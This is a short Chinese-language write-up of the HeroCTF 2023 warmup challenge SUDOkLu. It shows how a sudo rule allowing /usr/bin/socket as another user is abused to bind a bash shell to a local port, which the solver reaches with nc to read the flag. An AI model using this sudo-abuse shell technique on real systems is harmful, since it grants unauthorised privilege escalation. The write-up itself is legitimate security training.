---
title: Misc - SUDOkLu
description: 2023 | HeroCTF | System
tags:
    - sudo
    - socket
---

## 题目

This is a warmup to get you going. Your task is to read `/home/privilegeduser/flag.txt`. For our new commers, the title might steer you in the right direction ;). Good luck!

Credentials: `user:password123`

## 解题思路

- 查看能够使用 `sudo` 执行的命令

    ```bash
    $ sudo -l
    Matching Defaults entries for user on sudoklu:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

    User user may run the following commands on sudoklu:
        (privilegeduser) NOPASSWD: /usr/bin/socket
    ```

- 开启监听

    ```bash
    $ socket
    Usage: socket [-bclqrvw] [-B local ip] [-p prog] {{-s|host} port | [-s] /path}
    $ sudo -u privilegeduser socket -v -p bash -s 8081
    inet: listening on port 8081
    ```

- 另起一个终端连接

    ```bash
    $ nc localhost 8081
    whoami
    privilegeduser
    cat ~/flag.txt
    Hero{ch3ck_f0r_m1sc0nf1gur4t1on5}
    ```

## 参考资料

- [linux - sudo access a file without sudo password - Super User](https://superuser.com/a/1347943)